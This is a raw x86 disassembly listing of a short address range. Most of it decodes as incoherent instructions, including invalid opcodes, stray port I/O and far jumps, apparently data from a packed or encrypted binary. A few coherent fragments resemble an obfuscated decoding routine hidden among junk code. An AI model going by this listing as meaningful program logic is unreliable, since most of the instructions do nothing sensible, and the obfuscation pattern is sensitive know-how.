  4133c7:	arpl   WORD PTR [esi+0x6f],di
  4133ca:	fs sbb eax,0xb70e37f2
  4133d0:	fisubr WORD PTR [eax]
  4133d2:	cld    
  4133d3:	sahf   
  4133d4:	add    BYTE PTR [esi-0x6681327a],dl
  4133da:	les    ecx,FWORD PTR [edx+0x1a]
  4133dd:	push   esi
  4133de:	sahf   
  4133df:	mov    esi,ebx
  4133e1:	loope  0x413459
  4133e3:	jbe    0x413382
  4133e5:	loope  0x413463
  4133e7:	out    dx,al
  4133e8:	or     eax,0xd7fca445
  4133ed:	je     0x41341a
  4133ef:	(bad)  
  4133f1:	jo     0x4133d9
  4133f3:	daa    
  4133f4:	in     eax,0x8f
  4133f6:	lds    ebp,FWORD PTR [eax]
  4133f8:	sub    edx,DWORD PTR ds:0xe5d6efca
  4133fe:	jl     0x4133a6
  413400:	je     0x413430
  413402:	mov    esi,0xc7de71de
  413407:	loopne 0x41340b
  413409:	mov    dh,0xd3
  41340b:	loopne 0x4133b2
  41340d:	ins    DWORD PTR es:[edi],dx
  41340e:	sbb    eax,0x8ccbd2e0
  413413:	add    cl,bl
  413415:	test   DWORD PTR [edx],edx
  413417:	push   ebx
  413418:	icebp  
  413419:	test   al,0x62
  41341b:	lahf   
  41341c:	xchg   edx,eax
  41341d:	pop    esp
  41341e:	pop    eax
  41341f:	pop    ecx
  413420:	jmp    0x6fa2:0xcefc2273
  413427:	shl    DWORD PTR [edx],cl
  413429:	and    eax,DWORD PTR ds:0x2ba42715
  41342f:	jmp    0xad582918
  413434:	mov    ecx,0x2be7d0cc
  413439:	sbb    eax,0x1f
  41343c:	push   es
  41343d:	dec    esi
  41343e:	add    edi,DWORD PTR [ebp-0x14]
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0xc8d9485e
  41345f:	enter  0x7843,0x7f
  413463:	js     0x41344a
  413465:	jle    0x4134df
  413467:	js     0x413430
  413469:	out    0x82,al
  41346b:	dec    ebp
  41346c:	cmc    
  41346d:	sar    ah,cl
  41346f:	mov    esp,0xe8323417
  413474:	adc    al,BYTE PTR [ebp+0x78981e8c]
  41347a:	loop   0x413438
  41347c:	aad    0x2a
  41347e:	dec    edx
  41347f:	pop    eax
  413480:	xor    DWORD PTR [ecx+eax*1+0x6e],ecx
  413484:	mov    cl,BYTE PTR [ecx]
  413486:	mov    ch,0x7e
  413488:	fisub  DWORD PTR [ebp-0x694a7466]
  41348e:	add    esi,0xffffffb6
  413491:	(bad)  
  413492:	fadd   st,st(0)
  413494:	js     0x41343b
  413496:	sti    
  413497:	(bad)  
  413498:	cmp    eax,0xa8c64a52
  41349d:	mov    cl,0x64
  41349f:	and    eax,0xacdfbeb6
  4134a4:	inc    edx
  4134a5:	mov    dh,0xf0
  4134a7:	fild   QWORD PTR [ebp-0x65]
  4134aa:	rcl    BYTE PTR [edx-0x72bcb770],0x53
  4134b1:	pop    esi
  4134b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134b3:	mov    ebx,0xe1a4ad01
  4134b8:	(bad)  
  4134b9:	ffreep st(4)
  4134bb:	mov    dl,0xd6
  4134bd:	jnp    0x4134e9
  4134bf:	cld    
  4134c0:	inc    eax
  4134c1:	inc    eax
  4134c2:	retf   
  4134c3:	sbb    edx,DWORD PTR [ecx+0x5c]
  4134c6:	pop    ebx
  4134c7:	outs   dx,DWORD PTR ds:[esi]
  4134c8:	push   ebx
  4134c9:	push   ds
  4134ca:	mov    eax,ds:0xb518f927
  4134cf:	in     eax,dx
  4134d0:	in     eax,dx
  4134d1:	(bad)
  4134d4:	push   edx
  4134d5:	out    dx,al
  4134d6:	and    BYTE PTR [esi],ch
  4134d8:	inc    BYTE PTR [ebx+ecx*4]
  4134db:	pop    ebp
  4134dc:	adc    edi,DWORD PTR [ebx-0x4aeb4b3]
  4134e2:	pop    esi
  4134e3:	jmp    0xd9f7:0xaa199270
  4134ea:	test   eax,esp
  4134ec:	pusha  
  4134ed:	adc    eax,0x17a7a471
  4134f2:	jge    0x4134cf
  4134f4:	and    edi,DWORD PTR [edi+0x72]
  4134f7:	xor    eax,0x2597d971
  4134fc:	loopne 0x4134c9
  4134fe:	xor    al,0xed
  413500:	sub    DWORD PTR [edi+ebp*4],esp
  413503:	and    DWORD PTR [ecx+0x7d50f579],ebp
  413509:	jecxz  0x4134e0
  41350b:	sbb    eax,0x6d72e552
  413510:	jmp    0x413574
  413512:	jle    0x4134c6
  413514:	fisub  DWORD PTR [edi-0xc]
  413517:	add    eax,0x944f59de
  41351c:	xchg   DWORD PTR [eax-0xc0268a6],edi
  413522:	aaa    
  413523:	xor    ebp,edx
  413525:	fimul  DWORD PTR [ecx-0x6935836]
  41352b:	mov    bh,0xd3
  41352d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41352e:	pop    edi
  41352f:	add    al,BYTE PTR [ecx+0x6f5c13d7]
  413535:	(bad)  
  413536:	mov    edi,0x5e9d5ad0
  41353b:	and    bl,BYTE PTR [eax+ebp*8-0x7142de90]
  413542:	ja     0x4134ce
  413544:	add    al,BYTE PTR [esi+0x63]
  413547:	mov    ah,0x84
  413549:	stos   BYTE PTR es:[edi],al
  41354a:	jmp    0xe1a7:0xfd69552b
  413551:	adc    DWORD PTR [ebp+ebp*2-0x2182f8f7],0x1e534253
  41355c:	mov    eax,ds:0xf31d6c10
  413561:	xchg   edx,eax
  413562:	in     al,0x1
  413564:	inc    eax
  413565:	push   0x76b3ff8e
  41356a:	fcom   DWORD PTR [eax+0x69]
  41356d:	mov    BYTE PTR [ecx-0x3d77245a],al
  413573:	imul   esi,DWORD PTR [ebx+0xf],0x53
  413577:	pop    ds
  413578:	fcomp  DWORD PTR [edi]
  41357a:	add    al,BYTE PTR [esi+0x7f]
  41357d:	xchg   ebp,eax
  41357e:	sbb    cl,BYTE PTR [edx+0x4e]
  413581:	push   esp
  413582:	or     esi,DWORD PTR [edi+0x4350ca04]
  413588:	cmc    
  413589:	or     BYTE PTR ds:0x14d6c2db,ah
  41358f:	fadd   st,st(0)
  413591:	clc    
  413592:	test   eax,0x4e6b190f
  413597:	sub    ecx,DWORD PTR [ebp-0x6924da68]
  41359d:	dec    ebp
  41359e:	and    al,0x67
  4135a0:	jp     0x413569
  4135a2:	sub    ecx,DWORD PTR [edi+ebp*4-0x1b]
  4135a6:	pop    edx
  4135a7:	call   0xd9c48d13
  4135ac:	fxam   
  4135ae:	jecxz  0x4135e0
  4135b0:	popf   
  4135b1:	cmp    DWORD PTR [ebp+0x7980cd6b],esp
  4135b7:	mov    bl,0xf9
  4135b9:	(bad)  
  4135ba:	xchg   esi,eax
  4135bb:	jg     0x41355e
  4135bd:	sbb    al,0x6
  4135bf:	push   ebp
  4135c0:	jl     0x413579
  4135c2:	clc    
  4135c3:	dec    DWORD PTR [edi]
  4135c5:	mov    dh,bl
  4135c7:	mov    ds:0x5c3d9f99,al
  4135cc:	fwait
  4135cd:	mov    edi,0xfb876e86
  4135d2:	xchg   ebp,eax
  4135d3:	adc    al,0x77
  4135d5:	xchg   ebp,eax
  4135d6:	retf   0xad0e
  4135d9:	daa    
  4135da:	push   ds
  4135db:	clc    
  4135dc:	and    DWORD PTR [edi],ebp
  4135de:	das    
  4135df:	rcl    esi,0x2d
  4135e2:	outs   dx,BYTE PTR ds:[esi]
  4135e3:	mov    ah,0xb4
  4135e5:	fsub   QWORD PTR [edi]
  4135e7:	sbb    bh,BYTE PTR [ebp-0x71]
  4135ea:	pop    ecx
  4135eb:	dec    ecx
  4135ec:	xchg   ebp,eax
  4135ed:	sti    
  4135ee:	jl     0x41365f
  4135f0:	sub    DWORD PTR ds:0xfe635144,0x70
  4135f7:	cmp    esp,edx
  4135f9:	jecxz  0x413677
  4135fb:	inc    ebx
  4135fc:	xchg   ebx,eax
  4135fd:	icebp  
  4135fe:	mov    BYTE PTR [esi],dl
  413600:	jg     0x41359e
  413602:	call   0xa5e16527
  413607:	push   esi
  413608:	sub    al,0x42
  41360a:	jecxz  0x41363a
  41360c:	xor    eax,0x35a4434b
  413611:	(bad)  
  413612:	out    0x62,al
  413614:	out    0xa3,eax
  413616:	mov    edi,DWORD PTR [eax-0x2914e7be]
  41361c:	and    BYTE PTR [ebp-0x2d],cl
  41361f:	mov    bh,0x64
  413621:	sbb    eax,0x6071b413
  413626:	add    DWORD PTR [ebx+0x53],edi
  413629:	mov    eax,ds:0xf96682fc
  41362e:	mov    ch,0xc1
  413630:	jb     0x413602
  413632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413633:	les    eax,FWORD PTR [edi]
  413635:	jo     0x41362e
  413637:	push   esp
  413638:	add    al,0x6
  41363a:	mov    bh,0x43
  41363c:	push   esi
  41363d:	or     DWORD PTR [esi],edx
  41363f:	std    
  413640:	add    esi,DWORD PTR [esi+0x4da3932]
  413646:	mov    esi,0x8c20f2be
  41364b:	ret    0x2964
  41364e:	cmp    ecx,DWORD PTR [ebx-0x70c05f04]
  413654:	xchg   ecx,eax
  413655:	fbstp  TBYTE PTR [eax]
  413657:	and    esi,DWORD PTR [esi]
  413659:	push   edx
  41365a:	and    ebp,eax
  41365c:	test   eax,0xf5a2d491
  413661:	pop    edi
  413662:	ins    DWORD PTR es:[edi],dx
  413663:	imul   ecx,DWORD PTR [edx-0x5a],0xa3cb4002
  41366a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41366b:	lods   eax,DWORD PTR ds:[esi]
  41366c:	ins    DWORD PTR es:[edi],dx
  41366d:	cli    
  41366e:	cwde   
  41366f:	out    dx,al
  413670:	adc    al,0xc3
  413672:	mov    esp,0x67789db2
  413677:	lds    esp,FWORD PTR [edi+0x5d8a9d3e]
  41367d:	test   eax,0x90c4e7f4
  413682:	out    0xea,al
  413684:	lods   al,BYTE PTR ds:[esi]
  413685:	int3   
  413686:	aad    0x49
  413688:	or     eax,0xe150ed0f
  41368d:	jne    0x413669
  41368f:	imul   ebp,DWORD PTR [edx+ebx*2],0x5d
  413693:	sub    dh,BYTE PTR [eax]
  413695:	adc    bh,BYTE PTR [edi+ebx*4+0x4766fcf2]
  41369c:	cmp    al,0x66
  41369e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41369f:	push   ds
  4136a0:	xchg   DWORD PTR [edx-0x6d4b5505],esi
  4136a6:	ret    
  4136a7:	inc    edi
  4136a8:	mov    ds:0x3bacc322,al
  4136ad:	add    al,0xed
  4136af:	cs adc eax,0x9f877be1
  4136b5:	dec    ecx
  4136b6:	in     al,0x79
  4136b8:	idiv   DWORD PTR ds:0x6fccc674
  4136be:	call   0x1748c505
  4136c3:	retf   0x206f
  4136c6:	das    
  4136c7:	dec    eax
  4136c8:	push   edi
  4136c9:	and    ebx,DWORD PTR [eax+0xb7698b7]
  4136cf:	cmp    DWORD PTR [esi-0x45],0xbc558b0f
  4136d6:	mov    edi,DWORD PTR [ebp-0xc]
  4136d9:	xor    edx,eax
  4136db:	xor    edi,eax
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp-0x36968de7]
  4136f4:	loop   0x413729
  4136f6:	sub    BYTE PTR [ebp+0x7f],bh
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x4136cf
  4136ff:	pop    ss
  413700:	out    0x7,eax
  413702:	ret    0xa168
  413705:	inc    DWORD PTR [edi-0x2c]
  413708:	cld    
  413709:	push   edi
  41370a:	jmp    0x2d8c3624
  41370f:	sub    al,0x9e
  413711:	fisttp QWORD PTR [edi+0x15]
  413714:	mov    ah,0x6
  413716:	pop    ecx
  413717:	sahf   
  413718:	je     0x4136bd
  41371a:	in     al,dx
  41371b:	sub    eax,0xf2db8bee
  413720:	add    BYTE PTR [eax+0xb999ad6],0x4f
  413727:	ret    
  413728:	in     al,0xb9
  41372a:	pusha  
  41372b:	test   BYTE PTR [edx+0x57],0x79
  41372f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413730:	and    eax,0x12f280d3
  413735:	and    DWORD PTR [ebp+ebx*1-0x23],ebp
  413739:	mov    ebx,0xf33bcb31
  41373e:	jmp    0x4137a0
  413740:	xor    BYTE PTR [edi+ebp*1],ch
  413743:	xchg   DWORD PTR [eax],ebx
  413745:	push   ebx
  413746:	pop    esp
  413747:	iret   
  413748:	mov    ebp,0x670f97a4
  41374d:	fstp   QWORD PTR [edi]
  41374f:	(bad)  
  413750:	push   esp
  413751:	adc    dh,dh
  413753:	(bad)  
  413754:	stc    
  413755:	inc    eax
  413756:	imul   ebp,DWORD PTR [ecx+0x34],0xd5538959
  41375d:	call   FWORD PTR [ebp+0x38]
  413760:	mov    ah,0x2e
  413762:	add    al,BYTE PTR [esi+0xc446bf3]
  413768:	ss jecxz 0x413743
  41376b:	add    edi,DWORD PTR [ebp+0x107864a9]
  413771:	cmp    ebp,esp
  413773:	(bad)  
  413774:	jg     0x4137cd
  413776:	xchg   BYTE PTR [ebp+0x32],bl
  413779:	mov    al,ds:0x2b44f075
  41377e:	cs ins BYTE PTR es:[edi],dx
  413780:	repnz out 0x70,eax
  413783:	scas   eax,DWORD PTR es:[edi]
  413784:	mov    bh,0x77
  413786:	faddp  st(0),st
  413788:	out    dx,al
  413789:	sahf   
  41378a:	or     BYTE PTR [esi-0x74ad551d],ch
  413790:	ins    DWORD PTR es:[edi],dx
  413791:	int    0x44
  413793:	lea    esp,fs:[edx]
  413796:	mov    esi,0xac058c0f
  41379b:	inc    eax
  41379c:	pusha  
  41379d:	jb     0x41381c
  41379f:	dec    ecx
  4137a0:	push   ebx
  4137a1:	popa   
  4137a2:	pop    es
  4137a3:	or     al,0xae
  4137a5:	pop    es
  4137a6:	dec    edi
  4137a7:	mov    ch,0xda
  4137a9:	jns    0x4137fc
  4137ab:	inc    edi
  4137ac:	ficom  WORD PTR [edx+0x233915f5]
  4137b2:	dec    ebp
  4137b3:	mov    BYTE PTR [esi+edi*2-0x3e1b55fb],cl
  4137ba:	pusha  
  4137bb:	jmp    0x3c52:0x9dfd5edb
  4137c2:	mov    dh,0x83
  4137c4:	out    0x1a,al
  4137c6:	sub    esi,0xe
  4137c9:	imul   ebx,DWORD PTR [esi+0x201545ae],0xffffffba
  4137d0:	push   ss
  4137d1:	push   ebp
  4137d2:	lods   eax,DWORD PTR ds:[esi]
  4137d3:	adc    ebx,DWORD PTR [edi]
  4137d5:	dec    edx
  4137d6:	sbb    eax,0x82525a21
  4137db:	lea    esi,[esi-0x1d]
  4137de:	xchg   ecx,eax
  4137df:	int    0x82
  4137e1:	(bad)  
  4137e2:	shl    DWORD PTR [ebx-0x61],0x43
  4137e6:	test   ebx,ebp
  4137e8:	add    ecx,ebp
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	push   ebx
  4137ec:	aad    0xb2
  4137ee:	mov    cl,0xc4
  4137f0:	mov    eax,0xa377399b
  4137f5:	in     al,0xdd
  4137f7:	xchg   ebx,eax
  4137f8:	lds    esi,FWORD PTR [esp+ebx*4-0x2a]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jg     0x4137ee
  4137ff:	sbb    DWORD PTR [eax-0x52],0xffffffc7
  413803:	cmp    BYTE PTR [edi+0x5d882618],dh
  413809:	clc    
  41380a:	mov    al,0xb1
  41380c:	mov    edx,0xb2d68903
  413811:	imul   DWORD PTR [edi]
  413813:	shl    DWORD PTR [edi],0xae
  413816:	add    DWORD PTR [edx+0x593c339b],eax
  41381c:	mov    eax,0x3bfdc33e
  413821:	pop    edx
  413822:	leave  
  413823:	and    eax,0xbc7b8b40
  413828:	fisubr WORD PTR [ecx-0x228d8541]
  41382e:	dec    ebx
  41382f:	jecxz  0x413821
  413831:	jmp    0xbd7edde2
  413836:	add    dh,BYTE PTR [eax]
  413838:	cmp    eax,0x714f4139
  41383d:	(bad)  
  41383f:	fcmovnbe st,st(1)
  413841:	cmp    al,0xff
  413843:	fwait
  413844:	sbb    BYTE PTR [edx+edx*1+0x3c7103ad],0xcd
  41384c:	mov    bl,BYTE PTR [ecx-0x3f]
  41384f:	scas   al,BYTE PTR es:[edi]
  413850:	repz push ebp
  413852:	stos   DWORD PTR es:[edi],eax
  413853:	gs cdq 
  413855:	sub    eax,ecx
  413857:	cmp    BYTE PTR [eax+0x71],0x6a
  41385b:	push   edx
  41385c:	jae    0x4137ea
  41385e:	adc    bl,BYTE PTR [ebx-0x45847eed]
  413864:	mov    ch,0x3
  413866:	imul   edi,DWORD PTR [esi+0x39],0x18
  41386a:	adc    BYTE PTR [ecx+0x2d],0xc6
  41386e:	inc    esp
  41386f:	push   edx
  413870:	sub    DWORD PTR es:[ebx+ecx*4-0x42],ebp
  413875:	test   edx,esp
  413877:	(bad)  
  413878:	or     eax,DWORD PTR [edx]
  41387a:	out    dx,al
  41387b:	pop    edi
  41387c:	cli    
  41387d:	ja     0x4138e3
  41387f:	(bad)  
  413880:	jmp    0x3de875ec
  413885:	test   eax,0xab2bbeaf
  41388a:	lock cmp DWORD PTR [ecx+0x52],edx
  41388e:	add    al,0x82
  413890:	or     al,0xfd
  413892:	xchg   esp,eax
  413893:	jge    0x413872
  413895:	or     ebx,DWORD PTR [ecx]
  413897:	sub    BYTE PTR [ebp+0x7f69ad41],dh
  41389d:	inc    edi
  41389e:	in     al,0xd2
  4138a0:	push   esp
  4138a1:	mov    cl,0x3c
  4138a3:	mov    ecx,0xb17b7dc0
  4138a8:	repnz pop edi
  4138aa:	xchg   esi,eax
  4138ab:	mov    al,ds:0x80e6944e
  4138b0:	dec    ecx
  4138b1:	pusha  
  4138b2:	pop    esp
  4138b3:	mov    ch,0x56
  4138b5:	in     al,dx
  4138b6:	rcr    esi,0x8a
  4138b9:	ins    BYTE PTR es:[edi],dx
  4138ba:	mov    bh,0x3b
  4138bc:	xchg   esp,eax
  4138bd:	mov    bh,0x72
  4138bf:	xchg   ebp,eax
  4138c0:	jp     0x413890
  4138c2:	daa    
  4138c3:	xor    dh,BYTE PTR [eax+ebp*4]
  4138c6:	mov    eax,0xcc401874
  4138cb:	std    
  4138cc:	fsubrp st(4),st
  4138ce:	aas    
  4138cf:	xor    esp,ecx
  4138d1:	nop
  4138d2:	loopne 0x413910
  4138d4:	ret    
  4138d5:	ror    DWORD PTR [ecx+0x481e22d5],0xe1
  4138dc:	pop    esp
  4138dd:	pushf  
  4138de:	mov    dl,0xac
  4138e0:	data16 fucomp st(0)
  4138e3:	sar    DWORD PTR [esi+ebp*2+0x55c0bcce],cl
  4138ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138eb:	bound  eax,QWORD PTR [ecx-0x32]
  4138ee:	je     0x413884
  4138f0:	mov    ah,BYTE PTR [esi+0x218b6c88]
  4138f6:	stos   BYTE PTR es:[edi],al
  4138f7:	mov    WORD PTR [edi],fs
  4138f9:	mov    DWORD PTR [ecx+0x27],ebp
  4138fc:	mov    ah,0xe8
  4138fe:	test   eax,0x5cfd5a71
  413903:	icebp  
  413904:	pop    esp
  413905:	lds    esp,FWORD PTR [ebp+0x68]
  413908:	call   0x596f:0x97b8d977
  41390f:	lea    edx,[eax]
  413911:	jge    0x4138a6
  413913:	inc    esp
  413914:	dec    ebx
  413915:	mov    WORD PTR [ebp+0x56ebb0a8],ss
  41391b:	mov    al,0x6a
  41391d:	pop    es
  41391e:	(bad)  
  41391f:	xchg   edi,eax
  413920:	adc    BYTE PTR [edx],bh
  413922:	stc    
  413923:	outs   dx,BYTE PTR ds:[esi]
  413924:	mov    ecx,0xb59378f0
  413929:	call   0x6fb3:0x80706a90
  413930:	shl    DWORD PTR cs:[ecx-0x62],0xeb
  413935:	cmp    DWORD PTR [ebp+ebx*4+0x2867458a],0xb590359c
  413940:	mov    ebp,DWORD PTR [eax]
  413942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413943:	lds    esp,FWORD PTR [edi-0x5c]
  413946:	mov    dh,0x8
  413948:	jns    0x41392c
  41394a:	xchg   ecx,eax
  41394b:	lahf   
  41394c:	std    
  41394d:	call   0x9c96:0x35f07aed
  413954:	push   edx
  413955:	jnp    0x4139a4
  413957:	out    dx,eax
  413958:	sbb    eax,0xe28fb43b
  41395d:	lea    edi,[esp+edx*4-0x656a8872]
  413964:	mov    al,ds:0xcee9eee4
  413969:	imul   edx,edi
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x41399a
  413996:	pop    edx
  413997:	stos   DWORD PTR es:[edi],eax
  413998:	not    DWORD PTR [ebp-0x1a8780fd]
  41399e:	jle    0x413a18
  4139a0:	js     0x4139c9
  4139a2:	mov    ss,WORD PTR [ebx+0x20]
  4139a5:	jle    0x4139fb
  4139a7:	into   
  4139a8:	push   es
  4139a9:	or     al,BYTE PTR [edx+esi*1]
  4139ac:	pop    eax
  4139ad:	stos   DWORD PTR es:[edi],eax
  4139ae:	xchg   ecx,eax
  4139af:	sbb    al,0xb6
  4139b1:	and    dh,bl
  4139b3:	inc    eax
  4139b4:	adc    al,0xbe
  4139b6:	jmp    0x641f:0x878dcd4c
  4139bd:	jecxz  0x4139f5
  4139bf:	mov    ebx,0x99bd65e
  4139c4:	jl     0x413976
  4139c6:	and    edi,DWORD PTR [edi-0x59e02c0c]
  4139cc:	or     eax,0x1eeca082
  4139d1:	mov    al,ds:0xde57390d
  4139d6:	bswap  esi
  4139d8:	or     eax,DWORD PTR [edi-0x4aed2d4d]
  4139de:	mov    al,BYTE PTR [ecx-0x3e9a80]
  4139e4:	icebp  
  4139e5:	and    al,0x87
  4139e7:	xchg   ebx,eax
  4139e8:	rcl    DWORD PTR [edx+eax*4-0x31],1
  4139ec:	sbb    esi,esp
  4139ee:	push   0xffffff82
  4139f0:	jg     0x41398a
  4139f2:	in     al,dx
  4139f3:	dec    ebx
  4139f4:	inc    edi
  4139f5:	adc    DWORD PTR [ebx+ecx*8+0x3d6e5c58],0x5c
  4139fd:	jne    0x4139cc
  4139ff:	add    esi,DWORD PTR [eax]
  413a01:	inc    eax
  413a02:	imul   ecx,DWORD PTR [ecx-0x1b],0xffffffe9
  413a06:	cmp    bh,al
  413a08:	inc    eax
  413a09:	retf   
  413a0a:	mov    ah,BYTE PTR [ebx+0x8]
  413a0d:	sbb    BYTE PTR [ecx+0x21],bh
  413a10:	mov    al,ds:0xfdbd18b1
  413a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a16:	div    BYTE PTR [eiz*2-0x4d98e1d2]
  413a1d:	push   ds
  413a1e:	arpl   WORD PTR [edi+eax*2-0x64a3eab3],bp
  413a25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a26:	int3   
  413a27:	in     eax,0x5a
  413a29:	sbb    eax,0x7c4edd9d
  413a2e:	sahf   
  413a2f:	ins    BYTE PTR es:[edi],dx
  413a30:	fldcw  WORD PTR [edi+0x69]
  413a33:	xor    BYTE PTR [edi-0x7fbe450c],bl
  413a39:	repnz popa 
  413a3b:	dec    ebp
  413a3c:	in     eax,0xa5
  413a3e:	and    dh,BYTE PTR [edi-0x48637501]
  413a44:	fsub   st,st(7)
  413a46:	leave  
  413a47:	cmc    
  413a48:	jl     0x413a1a
  413a4a:	cmp    edx,eax
  413a4c:	jmp    0xb73d:0x83b9bc6a
  413a53:	dec    eax
  413a54:	icebp  
  413a55:	sbb    al,0x91
  413a57:	retf   
  413a58:	les    eax,FWORD PTR [eax-0x59]
  413a5b:	xlat   BYTE PTR ds:[ebx]
  413a5c:	inc    esi
  413a5d:	dec    ebx
  413a5e:	sub    eax,0x23c528d2
  413a63:	jl     0x4139fd
  413a65:	ins    BYTE PTR es:[edi],dx
  413a66:	icebp  
  413a67:	adc    edi,DWORD PTR [edi+eax*4-0x719b12c3]
  413a6e:	pop    edi
  413a6f:	jp     0x413a48
  413a71:	gs stos BYTE PTR es:[edi],al
  413a73:	pop    ebp
  413a74:	sub    edi,DWORD PTR [edi]
  413a76:	test   DWORD PTR [esi+0x2ae9d6aa],esi
  413a7c:	sub    ch,cl
  413a7e:	inc    ebx
  413a7f:	push   esp
  413a80:	test   eax,0x668abeee
  413a85:	loop   0x413a67
  413a87:	ret    
  413a88:	or     al,0xca
  413a8a:	push   esp
  413a8b:	and    eax,0xe0ad0c73
  413a90:	jl     0x413af4
  413a92:	mov    esp,0xf983e746
  413a97:	adc    BYTE PTR [eax+0x365e5ff5],ah
  413a9d:	fisttp WORD PTR [ebp+0x42358f4c]
  413aa3:	dec    edi
  413aa4:	and    ebx,DWORD PTR [ebx]
  413aa6:	xor    al,0x25
  413aa8:	data16 stc 
  413aaa:	cwde   
  413aab:	xor    bl,al
  413aad:	jmp    0x5c395da
  413ab2:	mov    edi,DWORD PTR [ebp+eiz*2+0x83dff04]
  413ab9:	mov    DWORD PTR [eax],ecx
  413abb:	test   BYTE PTR [ecx+0x53],0xec
  413abf:	pop    ebp
  413ac0:	adc    eax,0xf45497ad
  413ac5:	mov    dl,0x59
  413ac7:	adc    bl,bh
  413ac9:	js     0x413b1f
  413acb:	adc    eax,0x30ac5c89
  413ad0:	xchg   edx,eax
  413ad1:	jmp    0x413a9a
  413ad3:	sub    DWORD PTR [esi-0x3457d7de],esi
  413ad9:	pop    edx
  413ada:	mov    ecx,0xa59e4858
  413adf:	or     ch,BYTE PTR [eax]
  413ae1:	lods   al,BYTE PTR ds:[esi]
  413ae2:	sub    eax,0xccf5d66c
  413ae7:	sbb    al,0xf1
  413ae9:	jmp    0x6139d042
  413aee:	cmp    ch,BYTE PTR [edi+0x42104a2c]
  413af4:	shl    DWORD PTR [edi],cl
  413af6:	pop    edi
  413af7:	mov    BYTE PTR [ebx-0x7c8162de],cl
  413afd:	or     dl,BYTE PTR [esi+0x44]
  413b00:	pop    ebx
  413b01:	xor    DWORD PTR [ebx+0x75],0xffffffe7
  413b05:	and    DWORD PTR [ecx+0x2152a69b],ebx
  413b0b:	lahf   
  413b0c:	jmp    0x413aa3
  413b0e:	sbb    ecx,ebp
  413b10:	mov    bh,0x61
  413b12:	and    edx,DWORD PTR [edx-0x30]
  413b15:	out    0x8e,eax
  413b17:	data16 cmc 
  413b19:	outs   dx,BYTE PTR ds:[esi]
  413b1a:	fstp   TBYTE PTR [edx+0x2b]
  413b1d:	fs scas al,BYTE PTR es:[edi]
  413b1f:	sbb    al,0xcf
  413b21:	jl     0x413b97
  413b23:	repnz cmc 
  413b25:	retf   0x5ada
  413b28:	(bad)  
  413b29:	lahf   
  413b2a:	pusha  
  413b2b:	(bad)  
  413b2c:	out    dx,eax
  413b2d:	jle    0x413b69
  413b2f:	add    al,0xad
  413b31:	dec    esi
  413b32:	mov    bh,0xea
  413b34:	sub    al,0xbc
  413b36:	push   cs
  413b37:	xchg   ecx,eax
  413b38:	push   edx
  413b39:	lea    eax,[ecx-0x3781a15c]
  413b3f:	xlat   BYTE PTR ds:[ebx]
  413b40:	fwait
  413b41:	scas   al,BYTE PTR es:[edi]
  413b42:	(bad)  
  413b43:	ja     0x413b0d
  413b45:	lods   al,BYTE PTR ss:[esi]
  413b47:	shl    BYTE PTR [edx-0x5dd189fe],0xfb
  413b4e:	sub    ecx,edx
  413b50:	(bad)  
  413b51:	cdq    
  413b52:	out    dx,al
  413b53:	(bad)  
  413b54:	out    dx,eax
  413b55:	mov    bh,0x15
  413b57:	adc    BYTE PTR ds:0xb7e26944,ch
  413b5d:	lds    ebx,FWORD PTR [edi-0x36]
  413b60:	stc    
  413b61:	jge    0x413ba8
  413b63:	and    ch,dh
  413b65:	or     al,0x1e
  413b67:	call   0xba13c70c
  413b6c:	xchg   BYTE PTR [edx],ah
  413b6e:	retf   
  413b6f:	test   eax,0xf9a87bc
  413b74:	cdq    
  413b75:	jmp    0x413b59
  413b77:	pop    eax
  413b78:	repnz (bad) 
  413b7a:	push   ds
  413b7b:	inc    eax
  413b7c:	mov    ds:0x94c64acc,al
  413b81:	sbb    eax,0xbcadfef0
  413b86:	push   eax
  413b87:	clc    
  413b88:	mov    ebx,DWORD PTR [eax]
  413b8a:	jno    0x413bf3
  413b8c:	je     0x413bb6
  413b8e:	mov    bh,0xbe
  413b90:	dec    eax
  413b91:	in     al,dx
  413b92:	xor    cl,dl
  413b94:	(bad)  
  413b95:	iret   
  413b96:	pop    edx
  413b97:	sar    BYTE PTR [edi+eiz*1-0x4f10a321],1
  413b9e:	add    eax,0x65906d77
  413ba3:	or     DWORD PTR [ebx+0x555f197],ebp
  413ba9:	scas   al,BYTE PTR es:[edi]
  413baa:	push   ecx
  413bab:	mov    bh,0x94
  413bad:	push   0xffffffa2
  413baf:	(bad)  
  413bb0:	icebp  
  413bb1:	adc    ebp,DWORD PTR [ebx]
  413bb3:	lds    ebp,FWORD PTR [edx+0x1b5eb9fa]
  413bb9:	dec    edi
  413bba:	xchg   edx,eax
  413bbb:	push   ss
